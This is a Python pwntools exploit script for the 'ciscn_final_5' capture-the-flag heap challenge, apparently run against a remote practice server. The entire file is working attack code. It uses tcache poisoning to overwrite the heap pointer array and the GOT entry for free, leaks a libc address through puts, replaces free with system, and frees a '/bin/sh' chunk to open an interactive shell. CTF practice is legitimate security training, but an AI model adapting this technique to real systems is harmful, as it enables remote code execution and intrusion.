from pwn import *

#context.log_level = 'debug'

pn = './ciscn_final_5'
#p = process(pn)
p = remote('node4.buuoj.cn', 27887)
elf = ELF(pn)
libc = ELF('libc-2.27.buu.so')

free_got = elf.got['free']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
heaparray = 0x6020E0


def alloc(index, size, content):
    p.sendlineafter(b'choice: ', b'1')
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'content', content)

def delete(index):
    p.sendlineafter(b'choice: ', b'2')
    p.sendlineafter(b'index: ', str(index).encode())

def edit(index, content):
    p.sendlineafter(b'choice: ', b'3')
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendafter(b'content', content)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

alloc(16, 0x20, p64(0) + p64(0x91)) #0
alloc(1, 0x80, b'a') #1
alloc(2, 0x80, b'a') #2

delete(2)
delete(1)
delete(0)

alloc(1, 0x80, b'a' * 0x10 + p64(0) + p64(0x91) + p64(heaparray)) #0

alloc(3, 0x80, b'a') #1
alloc(4, 0x80, p64(free_got - 8) + p64(puts_got | 1)) #2
edit(0, b'/bin/sh\x00' + p64(puts_plt))

delete(1)

libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
system = libc_base + libc.sym['system']

success('libc_base -> {}'.format(hex(libc_base)))

edit(0, b'/bin/sh\x00' + p64(system))

delete(0)

p.interactive()